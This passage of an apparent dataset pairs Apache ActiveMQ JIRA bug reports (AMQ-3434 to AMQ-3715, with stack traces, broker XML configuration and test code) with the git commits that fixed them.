	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:297)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.lang.NoClassDefFoundError: org/slf4j/impl/StaticLoggerBinder
	at org.slf4j.LoggerFactory.getSingleton(LoggerFactory.java:230)
	at org.slf4j.LoggerFactory.bind(LoggerFactory.java:121)
	at org.slf4j.LoggerFactory.performInitialization(LoggerFactory.java:112)
	at org.slf4j.LoggerFactory.getILoggerFactory(LoggerFactory.java:275)
	at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:248)
	at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:261)
	at org.apache.activemq.ActiveMQPrefetchPolicy.<clinit>(ActiveMQPrefetchPolicy.java:38)
	at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:88)
	at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:131)
	at com.fusesource.example.Producer.<init>(Producer.java:25)
	at com.fusesource.example.DEV3783.main(DEV3783.java:47)
	... 6 more
Caused by: java.lang.ClassNotFoundException: org.slf4j.impl.StaticLoggerBinder
	at java.net.URLClassLoader$1.run(URLClassLoader.java:202)
	at java.security.AccessController.doPrivileged(Native Method)
	at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
	... 17 more

[1] http://activemq.apache.org/initial-configuration.html",de08e4b56ccb09083a3dd9e9f41743a018474d23,"apply fix for: https://issues.apache.org/jira/browse/AMQ-3715

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1243652 13f79535-47bb-0310-9956-ffa450edef68"
12542419,AMQ-3715,"According to the documentation [1], the activemq-all.jar should contain all required libraries.  However when running a sample project the following error occurs:

java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:297)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.lang.NoClassDefFoundError: org/slf4j/impl/StaticLoggerBinder
	at org.slf4j.LoggerFactory.getSingleton(LoggerFactory.java:230)
	at org.slf4j.LoggerFactory.bind(LoggerFactory.java:121)
	at org.slf4j.LoggerFactory.performInitialization(LoggerFactory.java:112)
	at org.slf4j.LoggerFactory.getILoggerFactory(LoggerFactory.java:275)
	at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:248)
	at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:261)
	at org.apache.activemq.ActiveMQPrefetchPolicy.<clinit>(ActiveMQPrefetchPolicy.java:38)
	at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:88)
	at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:131)
	at com.fusesource.example.Producer.<init>(Producer.java:25)
	at com.fusesource.example.DEV3783.main(DEV3783.java:47)
	... 6 more
Caused by: java.lang.ClassNotFoundException: org.slf4j.impl.StaticLoggerBinder
	at java.net.URLClassLoader$1.run(URLClassLoader.java:202)
	at java.security.AccessController.doPrivileged(Native Method)
	at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
	... 17 more

[1] http://activemq.apache.org/initial-configuration.html",73a30f6991e144a09bee7042f3a30b3e9871eefc,"apply updated fix for: https://issues.apache.org/jira/browse/AMQ-3715

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1243697 13f79535-47bb-0310-9956-ffa450edef68"
12541440,AMQ-3700,"The following stack was reproduced in AMQ 5.5.1 but not the Fuse Message Broker version.

{noformat}

Exception in thread ""BrokerService[3561F026-E8F62746-2A202922-F17EADF0-7BCA8E67] Task-5053"" java.util.ConcurrentModificationException
jvm 1    | 	at java.util.LinkedHashMap$LinkedHashIterator.nextEntry(LinkedHashMap.java:373)
jvm 1    | 	at java.util.LinkedHashMap$ValueIterator.next(LinkedHashMap.java:388)
jvm 1    | 	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1376)
jvm 1    | 	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:127)
jvm 1    | 	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)
jvm 1    | 	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
jvm 1    | 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
jvm 1    | 	at java.lang.Thread.run(Thread.java:662)

{noformat}

This can happened only in the case where the optimizedDispatch mode is enabled and multiple producers are waiting for space.  When the memory usage decreases and the notifications are run from the iterate() method the method can be called recursively leading to the error as items are removed from the messagesWaitingForSpace map.  

",1a566ecff7172b1969855f51a5329c53ee157bdc,"Test case for: https://issues.apache.org/jira/browse/AMQ-3700

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1241073 13f79535-47bb-0310-9956-ffa450edef68"
12539702,AMQ-3679,"The pom.xml for the activeio component generates invalid OSGI metadata for the optional import of the org.objectweb.howl.log package. I believe this should be changed to:

<activeio.osgi.import.pkg>
         org.objectweb.howl.log*;resolution:=optional,
         *
</activeio.osgi.import.pkg>",6aad9f6bed9dd32580024c679246432cc399db7e,"https://issues.apache.org/jira/browse/AMQ-3679 - add new modules to osgi metadata

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1329662 13f79535-47bb-0310-9956-ffa450edef68"
12539109,AMQ-3669,"We fill a queue that is backed by a qmirror with data (persistent) that exceeds the configured memory limit.
The producer (producerFlowControl=""true"" at queue and qmirror) will be throttled when the the limit is reached, no messages are spooled to disk.
As an overall result, we are not able to write a lot of messages into amq.

*Configuration:*

{code:xml} 
	<destinationInterceptors>
		<mirroredQueue copyMessage = ""true"" postfix="".qmirror"" prefix=""""/>
	</destinationInterceptors>

	<destinationPolicy>
		<policyMap>
		  <policyEntries>
			<policyEntry topic="">"" producerFlowControl=""true"" memoryLimit=""2mb"" />
			<policyEntry queue=""created.static.for.persistent"" producerFlowControl=""true"" memoryLimit=""1mb"" />
		  </policyEntries>
		</policyMap>
	</destinationPolicy> 

	<destinations>
		<queue physicalName=""created.static.for.persistent"" />
	</destinations>

	<persistenceAdapter>
		<kahaDB directory=""${activemq.base}/data/kahadb""/>
	</persistenceAdapter>
	
	<systemUsage>
		<systemUsage>
			<memoryUsage><memoryUsage limit=""10 mb"" /></memoryUsage>
			<storeUsage><storeUsage limit=""100 mb""/></storeUsage>
			<tempUsage><tempUsage limit=""100 mb""/></tempUsage>
		</systemUsage>
	</systemUsage>
	
	<transportConnectors>
		<transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616""/>
	</transportConnectors>
 {code}

*Java test code:*

{code} 
    ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(""tcp://localhost:61616"");
    Connection connection = factory.createConnection(""user"", ""pwd"");
    connection.start();
    Session session = connection.createSession(false, Session.CLIENT_ACKNOWLEDGE);
    Destination destination = session.createQueue(""created.static.for.persistent"");
    MessageProducer producer = session.createProducer(destination);
    producer.setDeliveryMode(DeliveryMode.PERSISTENT);
    char[] m = new char[1024];
    Arrays.fill(m, 'x');
    // create some messages that have 1k each
    for (int i = 0; i < 12000; i++) {
      ActiveMQTextMessage message = new ActiveMQTextMessage();
      message.setText(new String(m));
      producer.send(message);
    }
    connection.stop();
    connection.close();
  }

{code} 

*Expectation:*

Messages should be written to disk when the memory limit exceeds, all messages should be available within the queue/topic.

*Result:*

 INFO | Usage Manager memory limit (2097152) reached for topic://created.static.for.persistent.qmirror. Producers will be throttled to the rate at which messages are removed from this destination to prevent flooding it. See http://activemq.apache.org/producer-flow-control.html for more info

Store percent used  : 10 
Memory percent used : 20
Temp percent used   : 0

Interesting: The smaller flow control for the queue (1mb) does not seem to catch but the qmirror does (2mb).
",d44513a6559f5163a81e7611ad79ee125e1546ce,"fix for: https://issues.apache.org/jira/browse/AMQ-3669

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1342028 13f79535-47bb-0310-9956-ffa450edef68"
12538633,AMQ-3665,"activemq-admin journal-audit can be used to dump the content of the AMQ store to system out. The format of the output is rendered using Velocity.
For large AMQ stores (e.g. 3GB) activemq-admin will run out of memory. 
This is because Velocity internally uses an introSpectionCache that fills up over time until heap memory is exhausted. 

There is some documentation on that cache in the Velocity [Developers Guide|http://velocity.apache.org/engine/devel/developer-guide.html] in section ""Other Context Issues"":

{quote}
One of the features provided by the VelocityContext (or any Context derived from AbstractContext) is node specific introspection caching. Generally, you as a the developer don't need to worry about this when using the VelocityContext as your context. However, there is currently one known usage pattern where you must be aware of this feature.

The VelocityContext will accumulate intropection information about the syntax nodes in a template as it visits those nodes. So, in the following situation:

- You are iterating over the same template using the same VelocityContext object.
- Template caching is off.
- You request the Template from getTemplate() on each iteration.

It is possible that your VelocityContext will appear to 'leak' memory (it is really just gathering more introspection information.) What happens is that it accumulates template node introspection information for each template it visits, and as template caching is off, it appears to the VelocityContext that it is visiting a new template each time. Hence it gathers more introspection information and grows. It is highly recommended that you do one or more of the following:

- Create a new VelocityContext for each excursion down through the template render process. This will prevent the accumulation of introspection cache data. For the case where you want to reuse the VelocityContext because it's populated with data or objects, you can simply wrap the populated VelocityContext in another, and the 'outer' one will accumulate the introspection information, which you will just discard. Ex. VelocityContext useThis = new VelocityContext( populatedVC ); This works because the outer context will store the introspection cache data, and get any requested data from the inner context (as it is empty.) Be careful though - if your template places data into the context and it's expected that it will be used in the subsequent iterations, you will need to do one of the other fixes, as any template #set() statements will be stored in the outermost context. See the discussion in Context chaining for more information.
- Turn on template caching. This will prevent the template from being re-parsed on each iteration, resulting the the VelocityContext being able to not only avoid adding to the introspection cache information, but be able to use it resulting in a performance improvement.
- Reuse the Template object for the duration of the loop iterations. Then you won't be forcing Velocity, if the cache is turned off, to reread and reparse the same template over and over, so the VelocityContext won't gather new introspection information each time.
{quote}


Right now the Velocity introSpectionCache grows with every entry read from the journal until an OOM error is raised. 
",4ddd9019c8e59ff0940b04baa24a47e0725ba137,"AMQ-3665: Turned on Velocity template caching to reduce memory footprint of AMQ store journal reader. 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1234779 13f79535-47bb-0310-9956-ffa450edef68"
12538633,AMQ-3665,"activemq-admin journal-audit can be used to dump the content of the AMQ store to system out. The format of the output is rendered using Velocity.
For large AMQ stores (e.g. 3GB) activemq-admin will run out of memory. 
This is because Velocity internally uses an introSpectionCache that fills up over time until heap memory is exhausted. 

There is some documentation on that cache in the Velocity [Developers Guide|http://velocity.apache.org/engine/devel/developer-guide.html] in section ""Other Context Issues"":

{quote}
One of the features provided by the VelocityContext (or any Context derived from AbstractContext) is node specific introspection caching. Generally, you as a the developer don't need to worry about this when using the VelocityContext as your context. However, there is currently one known usage pattern where you must be aware of this feature.

The VelocityContext will accumulate intropection information about the syntax nodes in a template as it visits those nodes. So, in the following situation:

- You are iterating over the same template using the same VelocityContext object.
- Template caching is off.
- You request the Template from getTemplate() on each iteration.

It is possible that your VelocityContext will appear to 'leak' memory (it is really just gathering more introspection information.) What happens is that it accumulates template node introspection information for each template it visits, and as template caching is off, it appears to the VelocityContext that it is visiting a new template each time. Hence it gathers more introspection information and grows. It is highly recommended that you do one or more of the following:

- Create a new VelocityContext for each excursion down through the template render process. This will prevent the accumulation of introspection cache data. For the case where you want to reuse the VelocityContext because it's populated with data or objects, you can simply wrap the populated VelocityContext in another, and the 'outer' one will accumulate the introspection information, which you will just discard. Ex. VelocityContext useThis = new VelocityContext( populatedVC ); This works because the outer context will store the introspection cache data, and get any requested data from the inner context (as it is empty.) Be careful though - if your template places data into the context and it's expected that it will be used in the subsequent iterations, you will need to do one of the other fixes, as any template #set() statements will be stored in the outermost context. See the discussion in Context chaining for more information.
- Turn on template caching. This will prevent the template from being re-parsed on each iteration, resulting the the VelocityContext being able to not only avoid adding to the introspection cache information, but be able to use it resulting in a performance improvement.
- Reuse the Template object for the duration of the loop iterations. Then you won't be forcing Velocity, if the cache is turned off, to reread and reparse the same template over and over, so the VelocityContext won't gather new introspection information each time.
{quote}


Right now the Velocity introSpectionCache grows with every entry read from the journal until an OOM error is raised. 
",00bee4ee1341f19aa69748155a8bb9b722c26065,"AMQ-3665: Added JUnit test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1234782 13f79535-47bb-0310-9956-ffa450edef68"
12532121,AMQ-3601,A no-args constructor should be added to org.apache.activemq.util.ByteSequence,b6a3990d48e6852ca8ed9ffbbd9de4c31440d859,"fix for: https://issues.apache.org/jira/browse/AMQ-3601

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1213298 13f79535-47bb-0310-9956-ffa450edef68"
12531805,AMQ-3600,"impl from https://issues.apache.org/jira/browse/AMQ-3204 - the broker filter needs to intercept processConsumerControl and for good measure messagePull

The processConsumerControl is used on failover recovery and will result in destination creation with out the separator replacement.",721d623ff6715cef7cec88e2c5eb3a98fd9f5cdf,"https://issues.apache.org/jira/browse/AMQ-3600 - test should not be run with individual ack, persist redelivery count mode

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1203773 13f79535-47bb-0310-9956-ffa450edef68"
12530356,AMQ-3580,"Hi,

There is a misleading part in how to configure activemq with spring if someone's needs an embedded broker:
(section Using an embedded broker).

This section references BrokerFactoryBean to use to instantiate broker within spring context. Unfortunately this class is deficient in a way it will terminate a broker immidiately after factory was used and destroyed. 


",e1a363f96e35a1b8054e0c6abc3d154198b7b689,AMQ-3580: Added unit test
12527083,AMQ-3542,"static discovery will try to connect to all provided urls. When the list is a master/slave pair with shared storage, only one will active, leading log messages indicating repeated failure to connect.
A potential solution is to use failover: just to pick a url but let it delegate failover to the network connector such that the network bridge is correctly stopped/restarted.
  {{static:(failover:(tcp://a:61616,tcp://slave:61616)?maxReconnectAttempts=..)}}
This does not work reliably atm, due to inconsistency in the failover reconnect logic, a network connectors interest in transport interruption/resumption and the lack of thread safety in tracking existing bridges.

 ",f4e0725420ec14bf667c0caff5b74f6c0a028cdb,"https://issues.apache.org/jira/browse/AMQ-3542 - prevent failover reconnect till start is initiated, prevents connection establishment w/o a listener which ensures a bridge is already ready to handle a response and start a local bridge, useDedicatedTaskRunner=true can lead to this case

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1186654 13f79535-47bb-0310-9956-ffa450edef68"
12522314,AMQ-3490,"In a scenario where a single-consumer queue for non-presistent messages uses a file cursor to manage a backlog, bursts of messages result in NPEs.

Thread dumps for 3 different examples:

2011-09-07 12:43:27,057 ERROR [cursors.FilePendingMessageCursor] [] : [Usage Async Task] Caught an IO Exception getting the DiskList7_PendingCursor:snTableQueue_CHF
java.lang.NullPointerExceptionnull
    at java.io.Writer.write(Writer.java:140)null
    at java.io.BufferedWriter.newLine(BufferedWriter.java:225)null
    at java.util.Properties.writeComments(Properties.java:671)null
    at java.util.Properties.store0(Properties.java:805)null
    at java.util.Properties.store(Properties.java:796)null
    at org.apache.kahadb.page.PageFile.storeMetaData(PageFile.java:570)null
    at org.apache.kahadb.page.PageFile.load(PageFile.java:361)null
    at org.apache.activemq.store.kahadb.plist.PListStore.intialize(PListStore.java:285)null
    at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:218)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:435)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.onUsageChanged(FilePendingMessageCursor.java:388)null
    at org.apache.activemq.usage.Usage$1.run(Usage.java:268)null
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)null
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)null
    at java.lang.Thread.run(Thread.java: 619)null
Exception in thread ""Usage Async Task"" java.lang.RuntimeException: java.lang.NullPointerException

    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:460)

    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:435)

    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.onUsageChanged(FilePendingMessageCursor.java:388)

    at org.apache.activemq.usage.Usage$1.run(Usage.java:268)

    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)

    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)

    at java.lang.Thread.run(Thread.java:619)
Caused by: java.lang.NullPointerException

    at java.io.Writer.write(Writer.java:140)

    at java.io.BufferedWriter.newLine(BufferedWriter.java:225)

    at java.util.Properties.writeComments(Properties.java:671)


================================================================

2011-09-07 12:43:40,908 ERROR [cursors.FilePendingMessageCursor] [1315421994681] : [ActiveMQ Transport: tcp:///134.242.171.26:35469]
 Caught an IO Exception getting the DiskList 7_PendingCursor:snTableQueue_CHF
java.lang.NullPointerExceptionnull
    at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:229)null
    at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)null
    at org.apache.activemq.store.kahadb.plist.PListStore.getPLis
t(PListStore.java:225)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:226)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:196)null
    at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1603)null  
    at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:715)null
    at org.apache.activemq.broker.region.Queue.send(Queue.java:647)null
    at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:409)null
    at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:543)null
    at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:301)null
    at o
rg.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null
    at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)null
    at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)null

    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null  
    at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:192)null
    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null  
    at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)null
    at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)null
    at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:68
1)null
    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)null
    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)null
    at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)null
    at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)null

    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:216)null
    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)null
    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)null
    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)null      
    at java.lang.Thread.run(Thread.java:619)null

=======================================================================================


2011-09-07 12:43:41,028 ERROR [cursors.FilePendingMessageCursor] [1315421994681] : [ActiveMQ Transport: tcp:///134.242.171.26:35469]
 Caught an Exception adding a message: ActiveMQObjectMessage {commandId = 82, responseRequired = false, messageId = ID:lgvn-330
53-1315415867932-0:19:1:1:78, originalDestination = null, originalTransactionId = null, producerId = ID:lgvn-33053-131541586793
2-0:19:1:1, destination = queue://snTableQueue_CHF, transactionId = null, expiration = 0, timestamp = 1315424620840,
 arrival = 0, brokerInTime = 1315424620881, brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null
, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@d42d49, marshalledProperties = org.apache.activemq.util.ByteSequence@1e91c40, dataStructure = null, redeliveryCounter = 0, size = 0, properties = {TO=0, FROM=37, HOST=134.242.171.26, trigger_name=com.foo.receiver.beans.ACTData, version=3.4}, readOnlyProperties = false, readOnlyBody = false, droppable = false} first to FilePendingMessageCursor
java.lang.RuntimeException: java.lang.NullPointerExceptionnull
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:460)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:226)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:196)null
    at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1603)null  
    at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:715)null
    at org.apache.activemq.broker.region.Queue.send(Queue.java:647)null
    at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:409)null
    at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:543)null
    at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBrok
er.java:301)null
    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null  
    at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)null
    at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)null
    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null    
    at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:192)null
    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null
    at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)null      
    at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)null
    at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)null
    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)null

    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)null
    at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)null  
    at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)null
    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:216)null      
    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)null    
    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)null
    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)null  
    at java.lang.Thread.run(Thread.java:619)nullCaused by: java.lang.NullPointerExceptionnull    
    at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:229)null  
    at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)null  
    at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:225)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)null  

        ... 26 morenull ",7d082c36bbcbc3428e630523a54f169fe1fa017d,"https://issues.apache.org/jira/browse/AMQ-3490 - allow optional lazyInit of temp (plist) store

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1172528 13f79535-47bb-0310-9956-ffa450edef68"
12521829,AMQ-3488,"ActiveMQTempDestinations hold onto the source connection that created them. When the source connection is closed, its temporary destinations are deleted. Unfortunately, DestinationInfo commands convey the destination object with its source connection to all other connections on the same VMTransportServer. Hence when these other connections are closed, they attempt to delete the source connection's temporary destination.

Note that enabling marshaling on the VM transport works around this bug because destination serialization and deserialization does not maintain the source connection reference.

This bug was not present in 5.4.2.",4f14f1e5c09170abf94dd48541b6e572a1ca59f5,"fix for: https://issues.apache.org/jira/browse/AMQ-3488 along with test case

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1169514 13f79535-47bb-0310-9956-ffa450edef68"
12520013,AMQ-3473,"Two brokers, each with a network connection to the other. We have two producers producing persistent messages to a single queue at a rate of 20-50/second. There is a single consumer. All clients prefer the primary broker.

The consumer is 'bursty' - i.e. it grabs 5000 messages and then processes them. During processing, new messages build up on the broker.

If the primary broker is restarted we will see it come back with, as you would expect, with a number of pending messages. This message count never fully returns to 0 even if the producers are stopped and browsing the queue through the GUI shows either no messages or only messages that were produced since the restart.


I have turned on Kaha debugging and, after the initial restart, we see the following during every checkpoint:
 [eckpoint Worker] TRACE MessageDatabase                - Last update: 3974:2450180, full gc candidates set: [3950, 3951, 3973, 3974]
...
 [eckpoint Worker] TRACE MessageDatabase                - gc candidates after dest:1:MyQueue, [3951, 3973]
...
 [eckpoint Worker] TRACE MessageDatabase                - gc candidates: [3951, 3973]
 [eckpoint Worker] TRACE MessageDatabase                - not removing data file: 3951 as contained ack(s) refer to referenced file: [3950, 3951]
 [eckpoint Worker] DEBUG MessageDatabase                - Cleanup removing the data files: [3973]
(I assume that is supposed to say '[Checkpoint Worker]', incidentally)

After the second restart we will see many:
 [0.8.0.200:47300] WARN  MessageDatabase                - Duplicate message add attempt rejected. Destination: MyQueue, Message id: ID:node001-58675-1314038640553-0:17:1:1:470776

Followed by:
 [eckpoint Worker] TRACE MessageDatabase                - Last update: 3974:13515407, full gc candidates set: [3950, 3951, 3974]
...
 [eckpoint Worker] TRACE MessageDatabase                - gc candidates after dest:1:MyQueue, [3951]
...
 [eckpoint Worker] TRACE MessageDatabase                - gc candidates: [3951]
 [eckpoint Worker] DEBUG MessageDatabase                - Cleanup removing the data files: [3951]



This is very similar, if not the same, to AMQ-2955. I have tried setting 'useCache=false' but this does not rectify the issue. This could also be a similar issue to AMQ-3281.

I will attach a config. Please advise if you would like me to enable further debugging.

I don't currently have a test harness that replicates this issue and due to the fact this is only happening in our production environment, I'm unable to verify reliably whether messages are being lost, delayed or if this is purely a stats issue.


",fb0b63e3790dde151d8a8957fbec46553790eb25,"https://issues.apache.org/jira/browse/AMQ-3473 - Messages (possibly) stuck and pending messages count showing high number of pending message which do not get sent to a consumer. resolve the error in queue stats, message count and enqueue count when index suppressed a duplicate message add attempt

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1306228 13f79535-47bb-0310-9956-ffa450edef68"
12519007,AMQ-3454,"
I am testing ActiveMQ 5.5 with my own stress test. I tried to implement a stress test that use jms ressource in the same fashion that my application would do. 

For that, I used jms template (from Spring) and  a pooled connection factory (as recommended). I run a fixed number of thread that plublish on fixed number of topics. Each thread pick up a topic and enter a loop that will send a message on the choosen topic.

The issue is reproductible with SimpleAuthenticationPlugin active.  

Configuration of the test : 

* 100 topics
* more than one thread per topic (actually 1500 producer threads)

Common connection properties :
* alwaysSessionAsync=false
* dispatchAsync=false 
* optimizeAcknowledge=true
* socketBufferSize=131072&trace=true&wireFormat.cacheSize=2048&wireFormat.tcpNoDelayEnabled=true&wireFormat.tightEncodingEnabled=true&keepAlive=true&soTimeout=10000&connectionTimeout=10000\


Producers : 
* Message are not persistent
* There is no transaction
* Message expiration time is 30s
* Unsing JMS template singleton with a PooledConnectionFactory
* 3 JVM running 
* connection options alwaysSyncSend=true,copyMessageOnSend=false

Consumers :
* just listening to each topic with a SimpleMessageListenerContainer and count messages received
* 3 JVM running 


In attachment, you will find activemq config file and thread dumps. I can attach the producer/consumers code if you need it but I think you have your own tests.

This Jira is critical for me because security is mandatory for our use.

If you need more information, please ask.",00fb101e2a7ebc72506f8b237b5b0b8c5160a95d,"https://issues.apache.org/jira/browse/AMQ-3454 - all the little performance test, non imperative

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1207231 13f79535-47bb-0310-9956-ffa450edef68"
12518473,AMQ-3445,"When using jdbcPersistenceAdapter, if you restart the broker queues do not show up until they are manually created or a consumer re-connects. This is especially a problem for Virtual Topic consumers - for Virtual Topic consumers once the queue is created (and thereby subscribing to the virtual topic), they should get all messages published to the topic until consumer explicitly remove subscription by deleting the queue. With KahaDB this works correctly but not with jdbcPersistenceAdapter. Tried both 5.4.2 and 5.5 and both have the same issue.


To reproduce:
1. Setup broker using jdbcPersistenceAdapter 
2. Go to web console and create a queue: Consumer.MyApp.VirtualTopic.FOO
3. Go to topics page and create a topic: VirtualTopic.FOO
4. Send a message with Persistent Delivery to the topic
5. Verify queue has the message
6. Restart the broker
7. BUG: queue does not show up
8. Go to topics page and repeat steps 3 & 4
9. repeat step 2
10. BUG: only the first message shows up in the queue.

Do the same test on KahaDB and queue shows up in step 7 (and because of that) you get both messages in step 10.
 ",c062020bcbe03d09efe3721fbae2723d697734f5,"add a test to show that https://issues.apache.org/jira/browse/AMQ-3445 is not an issue in trunk.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1241935 13f79535-47bb-0310-9956-ffa450edef68"
12517771,AMQ-3434,"Ocassional ocurrance of stack trace{code}2011-06-30 16:02:09,903 [127.0.0.1:50524] ERROR FilePendingMessageCursor       - Caught an IO Exception getting the DiskList 98_PendingCursor:loadq-3
java.lang.NullPointerException
